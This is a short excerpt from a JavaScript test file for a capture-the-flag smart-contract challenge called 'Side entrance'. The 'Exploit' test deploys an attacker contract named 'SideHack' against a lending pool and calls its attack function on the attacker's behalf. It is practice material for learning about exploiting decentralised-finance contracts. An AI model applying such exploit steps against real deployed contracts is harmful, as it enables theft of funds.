...
describe('[Challenge] Side entrance', function () {
    ...
    it('Exploit', async function () {
        ...
        const SideHackFactory = await ethers.getContractFactory('SideHack', attacker)
        const sideHack = await SideHackFactory.deploy(this.pool.address);
        await sideHack.attack(attacker.address);
    });
